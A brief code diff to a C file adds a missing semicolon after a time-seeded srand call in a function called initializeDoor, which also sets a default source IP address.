@@ -68,7 +68,7 @@ void initializeDoor(AddrInfo *Addr_Ptr)
 {
     unsigned int iseed = (unsigned int)time(NULL);    // use the current time as the random seed value
     // seed random number generator
-    srand(iseed)
+    srand(iseed);
 
     // set defaults
     Addr_Ptr->SrcHost = GetIPAddress ();    // Default Source IP
